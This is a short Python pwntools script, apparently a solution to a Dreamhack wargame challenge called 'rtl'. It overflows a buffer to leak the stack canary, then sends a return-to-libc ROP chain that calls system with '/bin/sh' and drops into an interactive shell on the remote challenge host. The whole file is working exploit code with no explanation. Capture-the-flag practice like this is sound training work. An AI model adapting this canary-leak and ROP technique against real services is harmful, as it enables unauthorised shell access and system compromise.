from pwn import *

p = remote('host3.dreamhack.games', 19899)
e = ELF('./rtl')

payload = b'A' * 0x39
p.sendafter(b'Buf: ', payload)

p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))

binsh = 0x400874
pop = 0x400853
ret = 0x400285
system_plt = e.plt['system']
buf = b'A' * 0x38 + p64(canary)
buf += b'B' * 0x8 + p64(ret)
buf += p64(pop) + p64(binsh) + p64(system_plt)

p.sendafter(b'Buf: ', buf)

p.interactive()